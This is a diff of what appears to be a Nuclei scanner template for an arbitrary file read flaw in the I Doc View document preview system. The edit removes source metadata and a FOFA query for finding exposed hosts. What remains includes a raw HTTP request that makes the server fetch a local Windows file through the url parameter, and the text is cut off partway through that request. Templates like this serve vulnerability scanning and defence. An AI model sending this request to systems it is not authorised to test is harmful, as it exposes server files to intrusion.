@@ -3,12 +3,8 @@ info:
   name: I Doc View在线文档预览系统存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vd91dtba36fv5411'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vd91dtba36fv5411
-    fofa: title=="在线文档预览 - I Doc View"
 http:
 - raw:
   - 'GET /doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt HTTP/1.1
